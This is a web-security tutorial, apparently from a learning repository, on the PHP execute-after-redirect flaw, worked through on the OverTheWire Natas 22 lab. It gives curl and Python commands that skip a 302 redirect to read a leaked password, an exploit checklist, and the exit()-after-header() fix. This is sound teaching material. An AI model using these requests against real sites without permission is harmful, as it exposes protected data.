# 🌐 Web Security — HTTP Redirect Bypass

> The server redirects you to another page.
> But before redirecting, it says something — your browser just doesn't show it.

---

## 📋 Table of Contents

- [How Does HTTP Redirect Work?](#how-does-http-redirect-work)
- [302 Response Body](#302-response-body)
- [Not Following the Redirect](#not-following-the-redirect)
- [Usage in Natas](#usage-in-natas)

---

## How Does HTTP Redirect Work?

When the server returns a `Location` header along with a 301 or 302 status code, the browser automatically goes to the new URL.

```
Browser → GET /secret.php
Server  → HTTP/1.1 302 Found
            Location: /login.php
Browser → GET /login.php   (redirected automatically)
```

The browser **doesn't show the body** in a 302 response — it goes directly to the new URL.

### The Body of the 302 Response

When the server returns a 302, it can send a body too:

```
HTTP/1.1 302 Found
Location: /login.php
Content-Type: text/html

<html>
  <body>
    The password for natas23 is: [PASSWORD HERE!]
  </body>
</html>
```

The browser goes to `/login.php` without showing this body. But the body really was sent — the browser just doesn't process it.

---

## Not Following the Redirect

### With curl

```bash
# Default: curl does NOT follow the redirect
curl -u natas22:[password] http://natas22.natas.labs.overthewire.org/
# The body of the 302 response is visible

# Follow the redirect with -L (in this case the body is lost)
curl -L -u natas22:[password] http://natas22.natas.labs.overthewire.org/
```

### With Python requests

```python
import requests

# allow_redirects=False → don't follow the redirect
r = requests.get(
    url,
    auth=(username, password),
    allow_redirects=False
)
print(r.text)   # the 302 body
print(r.status_code)    # 302
print(r.headers['Location'])    # where it would have redirected
```

### With Burp Suite

Burp captures all requests and responses — even if there's a redirect, the 302 body is visible in Burp.

---

## Usage in Natas

### Natas 22 — Password in the 302 Body

**Source code:**

```php
<?php
session_start();

if(array_key_exists("revelio", $_GET)) {
    // if you're not an admin, redirect
    if(!($_SESSION and array_key_exists("admin", $_SESSION)
         and $_SESSION["admin"] == 1)) {
        header("Location: /");   // ← 302 redirect
    }
}
?>

<?php
    // This code runs even AFTER the redirect!
    if(array_key_exists("revelio", $_GET)) {
        print "You are an admin. The password for natas23 is: <censored>";
    }
?>
```

**Problem:** PHP signals a redirect with `header("Location: /")` but the code keeps running. The password is written to the HTML anyway — the browser just redirects without showing it.

**Exploit:**

```bash
# Don't follow the redirect with curl
curl -u natas22:[password] \
     "http://natas22.natas.labs.overthewire.org/?revelio"
# The password appears in the body
```

```python
import requests

r = requests.get(
    "http://natas22.natas.labs.overthewire.org/?revelio",
    auth=("natas22", "[password]"),
    allow_redirects=False
)
print(r.text)
```

---

### Why Does This Happen?

In PHP, sending a redirect with `header()` does **not** stop the code from running. You need to put `exit` or `die` after it:

```php
// BAD — code keeps running after header
header("Location: /login.php");
echo "Secret content";   // This still runs!

// GOOD — header + exit
header("Location: /login.php");
exit();
```

---

### HTTP Redirect — Checklist

```
Detection:
  ☐ Does the page redirect somewhere else instantly?
  ☐ Can a parameter like ?revelio, ?debug, ?show be tried in the URL?
  ☐ Is there a header("Location:...") in the source code?

Exploit:
  ☐ Try with curl (it doesn't follow redirects by default)
  ☐ Python requests → allow_redirects=False
  ☐ Burp Suite → see the 302 response body
```

---

## 🔗 Resources

- [MDN — HTTP 302](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/302)
- [PortSwigger — Unvalidated Redirects](https://portswigger.net/kb/issues/00500100_open-redirection-reflected)
- [PHP — header()](https://www.php.net/manual/en/function.header.php)

---

**Previous topic:** [15_session_and_newline_injection.md](./15_session_and_newline_injection.md)
**Next topic:** [17_php_type_juggling.md](./17_php_type_juggling.md)

*This guide is part of the [waitaseC137/linux_learning](https://github.com/waitaseC137/linux_learning) repository.*
